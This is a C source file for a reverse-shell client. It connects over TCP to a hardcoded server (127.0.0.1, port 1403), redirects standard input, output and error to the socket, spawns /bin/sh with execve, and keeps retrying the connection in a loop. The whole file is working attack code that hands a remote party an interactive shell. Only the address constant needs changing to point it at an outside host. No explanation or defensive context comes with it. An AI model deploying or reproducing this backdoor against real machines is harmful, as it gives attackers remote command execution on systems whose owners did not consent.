#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "1403"
#define MAX 100
int main(int argc, char *argv[])
{
    if (argc > 1)
    {
        printf("usage: ./client ");
        return (1);
    }
    char server_ip[INET6_ADDRSTRLEN] = SERVER_IP;
    char server_port[6] = SERVER_PORT;
    struct addrinfo hints, *res;
    int status;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;       // AF_INET or AF_INET6 to force version
    hints.ai_socktype = SOCK_STREAM; // using TCP
    if ((status = getaddrinfo(server_ip, server_port, &hints, &res)) != 0)
    { // error in getting address
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 3;
    }
    //--------------------
    int hand_off = 0; // for stop conneting again
    while (1)
    {
        int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (hand_off >= 10)
        {
            freeaddrinfo(res);
            close(sockfd);
            return 0;
        }
        if (sockfd < 0)
        {
            hand_off += 2;
            sleep(1);
            continue;
        }
        dup2(sockfd, 0); // change standard input to socket
        dup2(sockfd, 1); // change standard output to socket
        dup2(sockfd, 2); // change standard error to socket
        int c = connect(sockfd, res->ai_addr, res->ai_addrlen);
        if (c == 0)
        {

            pid_t shell_p = fork(); // creating a child proccess for shell
            if (shell_p == 0)
            {
                // runnig shell

                execve("/bin/sh", NULL, NULL);
            }
            else if (shell_p > 0)
            {
                // wait for shell to finish
                wait(NULL);
            }
            char connect_again[10] = {0};
            memset(connect_again, 0, sizeof(connect_again));
            if (recv(sockfd, connect_again, 10, 0) != -1)
            {
                if (strcmp("n\n", connect_again) == 0 || connect_again[0] == 'n')
                {
                    return 0;
                }
                else
                {
                    sleep(2);
                }
            }
        }
        else
        {
            hand_off += 2;
        }
        hand_off++;
        close(sockfd);
        sleep(2);
    }
    return 4;
}
